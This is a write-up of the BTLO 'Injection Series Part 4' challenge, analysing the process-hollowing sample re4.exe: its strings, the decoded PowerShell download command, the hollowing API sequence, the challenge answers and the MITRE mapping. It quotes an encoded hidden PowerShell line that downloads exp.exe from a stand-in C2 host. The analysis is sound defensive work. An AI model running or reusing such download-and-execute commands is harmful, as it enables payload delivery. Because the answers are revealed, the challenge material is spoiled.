# Injection Series Part 4 — BTLO Writeup

**Challenge:** [Injection Series Part 4](https://blueteamlabs.online/home/challenge/injection-series-part-4-8b3aaae8ca)
**Platform:** Blue Team Labs Online (BTLO)
**Category:** Reverse Engineering / Malware Analysis
**Difficulty:** Easy
**Sample:** `re4.exe` — PE32 executable for MS Windows, Intel i386, 5 sections

> This writeup is for educational purposes as part of the BTLO CTF challenge. The sample is used strictly under BTLO's usage agreement for the associated challenge and is not redistributed here.

---

## Overview

Static analysis of `re4.exe` (via `strings` and PE inspection) reveals a classic **Process Hollowing** technique:

1. A PowerShell command (Base64/UTF-16LE encoded) downloads a second-stage payload from a remote C2 server.
2. The malware spawns a legitimate Windows process (`notepad.exe`) in a **suspended** state.
3. It unmaps the legitimate process's original image from memory using an undocumented `ntdll` function.
4. It allocates memory in the target process, writes the downloaded payload into it.
5. It redirects the thread's entry point to the new code and resumes execution — the malicious payload now runs disguised as `notepad.exe`.

---

## Analysis Steps

### 1. Identify the file type

```bash
file re4.exe
```
```
re4.exe: PE32 executable for MS Windows 6.00 (console), Intel i386, 5 sections
```

Confirms a 32-bit Windows console PE executable.

### 2. Extract readable strings

```bash
strings re4.exe
```

This single pass surfaces almost everything needed to answer the challenge — no disassembler strictly required, though IDA/Ghidra can be used to confirm call order and offsets.

Key strings of interest:
- `c:\windows\syswow64\notepad.exe`
- `powershell.exe -ep bypass -windowstyle hidden -enc <Base64 blob>`
- `C:\windows\temp\exp.exe`
- `NtUnmapViewOfSection`
- Imports: `CreateProcessA`, `VirtualAllocEx`, `WriteProcessMemory`, `GetThreadContext`, `SetThreadContext`, `ResumeThread`, `ReadProcessMemory`, `GetProcAddress`, `GetModuleHandleA`

### 3. Decode the PowerShell payload

The `-enc` flag in PowerShell expects a **Base64-encoded UTF-16LE string**. Decoding the blob:

```
SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AcwBvAG0AZQBjADIALgBzAGUAcgB2AGUAcgAvAGUAeABwAC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABjADoAXABcAHcAaQBuAGQAbwB3AHMAXABcAHQAZQBtAHAAXABcAGUAeABwAC4AZQB4AGUACgA=
```

decodes to:

```powershell
Invoke-WebRequest -Uri http://somec2.server/exp.exe -OutFile c:\windows\temp\exp.exe
```

This is the download-and-drop stage of the infection: a payload (`exp.exe`) is pulled from an attacker-controlled domain and staged to disk before being loaded into the hollowed process.

### 4. Map the API sequence to Process Hollowing

The imports table lines up exactly with the standard process hollowing pattern:

| Stage | API |
|---|---|
| Spawn target process suspended | `CreateProcessA` (flag `0x4` = `CREATE_SUSPENDED`) |
| Unmap legitimate image | `NtUnmapViewOfSection` |
| Allocate memory in target | `VirtualAllocEx` |
| Write payload into memory | `WriteProcessMemory` |
| Get/set thread context (entry point) | `GetThreadContext` / `SetThreadContext` |
| Resume execution | `ResumeThread` |

---

## Question & Answer Breakdown

### Q1 — What is the process first spawned by the sample, and what API is used?
**Answer:** `notepad.exe, CreateProcessA`

The string `c:\windows\syswow64\notepad.exe` appears alongside the `CreateProcessA` import. Notepad is a common, trusted-looking hollowing target since it draws little attention from a user or lightweight monitoring.

### Q2 — The value 4 is pushed as a parameter to this API. What does it denote?
**Answer:** `CREATE_SUSPENDED`

In the Windows API, `CreateProcessA`'s `dwCreationFlags` parameter accepts `CREATE_SUSPENDED (0x00000004)`, which starts the primary thread of the new process in a suspended state — a prerequisite for hollowing, since the process's memory must be replaced before it starts executing.

### Q3 — What domain does the malware try to connect to?
**Answer:** `somec2.server`

Decoded from the Base64/UTF-16LE PowerShell `-enc` payload (`Invoke-WebRequest -Uri http://somec2.server/exp.exe ...`).

### Q4 — What cmdlet is used to download the file, and what is the path it's stored at?
**Answer:** `Invoke-WebRequest, c:\windows\temp\exp.exe`

From the same decoded PowerShell command: `Invoke-WebRequest -Uri http://somec2.server/exp.exe -OutFile c:\windows\temp\exp.exe`.

### Q5 — Just after the download instructions, a function from ntdll is loaded and invoked. What is the function name?
**Answer:** `NtUnmapViewOfSection`

This undocumented `ntdll.dll` function is used to unmap the legitimate module's memory region from the suspended process — the defining step of process hollowing, clearing space for the malicious payload.

### Q6 — What are the 2 APIs used to update the entry point and resume the thread?
**Answer:** `SetThreadContext, ResumeThread`

After the payload is written into the target process (`VirtualAllocEx` + `WriteProcessMemory`), `SetThreadContext` overwrites the suspended thread's register context (redirecting the entry point/instruction pointer to the malicious code), and `ResumeThread` resumes execution so the hollowed process begins running the injected payload.

### Q7 — What is the MITRE ATT&CK ID for this technique?
**Answer:** `T1055.012` — *Process Injection: Process Hollowing*

---

## Full Attack Chain Summary

```
PowerShell (encoded, hidden, -ExecutionPolicy Bypass)
        │
        ▼
Invoke-WebRequest → downloads exp.exe from somec2.server
        │
        ▼
Saves payload to c:\windows\temp\exp.exe
        │
        ▼
CreateProcessA(notepad.exe, CREATE_SUSPENDED)
        │
        ▼
NtUnmapViewOfSection  → unmaps notepad's legitimate image
        │
        ▼
VirtualAllocEx + WriteProcessMemory  → allocates space & writes payload
        │
        ▼
GetThreadContext + SetThreadContext  → redirects entry point
        │
        ▼
ResumeThread  → malicious code executes disguised as notepad.exe
```

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Defense Evasion / Privilege Escalation | Process Injection: Process Hollowing | T1055.012 |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 |
| Command and Control | Ingress Tool Transfer | T1105 |

---

## Notes & Caveats

- All answers above were derived from **static string analysis** of the binary (`strings`, PE metadata) plus knowledge of the standard process hollowing API sequence and PowerShell's `-EncodedCommand` (Base64/UTF-16LE) format.
- `strings` output does not preserve exact instruction execution order — the attack-chain ordering above reflects the conventional process hollowing sequence. For a rigorous confirmation of call order and instruction offsets, load `re4.exe` into IDA or Ghidra and trace execution from `CreateProcessA` onward.
- This sample and its associated materials are the property of Security Blue Team / BTLO and are used here strictly for educational writeup purposes under the challenge's usage terms. Do not redistribute the sample itself.
  
